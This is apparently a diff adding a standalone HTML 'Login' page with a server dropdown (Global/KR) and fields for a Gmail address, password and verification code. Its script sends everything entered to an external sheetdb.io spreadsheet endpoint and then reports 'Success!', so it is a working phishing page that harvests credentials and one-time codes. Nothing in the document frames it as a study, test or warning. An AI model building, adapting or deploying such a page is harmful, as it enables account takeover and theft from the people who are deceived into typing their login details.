@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+
+<style>
+body{
+  margin:0;
+  font-family:Arial;
+  background:#222;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+
+.box{
+  width:320px;
+  background:#111;
+  padding:20px;
+  border-radius:15px;
+  color:white;
+}
+
+input,select{
+  width:100%;
+  padding:12px;
+  margin:10px 0;
+  border:none;
+  border-radius:8px;
+}
+
+button{
+  width:100%;
+  padding:12px;
+  background:gold;
+  border:none;
+  border-radius:8px;
+}
+
+#loading{
+  display:none;
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  background:rgba(0,0,0,0.7);
+  justify-content:center;
+  align-items:center;
+  color:white;
+  flex-direction:column;
+}
+
+.spinner{
+  width:50px;
+  height:50px;
+  border:5px solid #ccc;
+  border-top:5px solid gold;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+  100%{transform:rotate(360deg);}
+}
+</style>
+</head>
+
+<body>
+
+<div id="loading">
+  <div class="spinner"></div>
+  Loading...
+</div>
+
+<div class="box">
+
+<h2>Login</h2>
+
+<select id="server">
+  <option>Global</option>
+  <option>KR</option>
+</select>
+
+<input id="gmail" placeholder="Gmail">
+<input id="pass" placeholder="pass">
+<input id="code" placeholder="Code">
+
+<button onclick="send()">Submit</button>
+
+</div>
+
+<script>
+function send(){
+
+  let loading = document.getElementById("loading");
+  loading.style.display = "flex";
+
+  let data = {
+    server: document.getElementById("server").value,
+    gmail: document.getElementById("gmail").value,
+    pass: document.getElementById("pass").value,
+    code: document.getElementById("code").value
+  };
+
+  fetch("https://sheetdb.io/api/v1/bim0t1uoy9f9j", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  })
+  .then(res => res.json())
+  .then(res => {
+    loading.style.display = "none";
+    alert("Success!");
+    console.log(res);
+  })
+  .catch(err => {
+    loading.style.display = "none";
+    alert("Error!");
+    console.log(err);
+  });
+
+}
+</script>
+
+</body>
+</html>
